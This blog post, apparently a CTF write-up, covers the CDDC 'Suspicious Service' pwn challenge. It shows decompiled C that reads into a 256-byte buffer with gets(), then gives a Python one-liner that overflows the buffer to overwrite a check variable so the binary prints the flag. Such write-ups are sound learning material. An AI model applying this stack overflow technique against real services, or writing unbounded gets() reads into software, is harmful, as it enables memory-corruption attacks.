---
title: CDDC [Suspicious Service]
author: Jason Chua (Coldspot)
date: 2020-07-8 21:24:30 +0800
categories: [CTF, CDDC]
tags: [tech, pwn, bof]
toc: true
comments: true
---

On the initial connection, this binary does not prints out anything and just waits for an input. Luckily, the binary was compiled with debugging symbols. This will make reversing much simpler.

<!--more-->

# Decompilation
Looking at the main function, we could guess that FUN_000110a0 is a gets function. Our job is to overwrite the local variable "local_c" to 0x1343d00 to run the `cat flag` command.

```c
undefined4 main(void)

{
  undefined local_10c [256];
  int local_c;
  
  FUN_00011090(stdin,0);
  FUN_00011090(stdout,0);
  FUN_00011090(stderr,0);
  local_c = 0x12345678;
  FUN_000110a0(local_10c);
  if (local_c == 0x1343d00) {
    FUN_000110b0("cat flag");
  }
  return 0;
}
```

```
GETS(3)       Linux Programmer's Manual

NAME
        gets - get a string from standard input (DEPRECATED)

SYNOPSIS
        #include <stdio.h>

        char *gets(char *s);

DESCRIPTION
        Never use this function.

        gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).
```

# Exploit

Our plan of action is to overwrite `local_c` by overflowing the buffer allocated for `local_10c`


This simple one-liner will overflow the buffer for the local_10c and overwrite the local_c variable.


```bash
python -c "import struct; print('A' * 256 + struct.pack('<I', 0x1343d00))" | .⁄SuspiciousSvc
```


More info 
> Ask me on Discord @Coldspot#7033
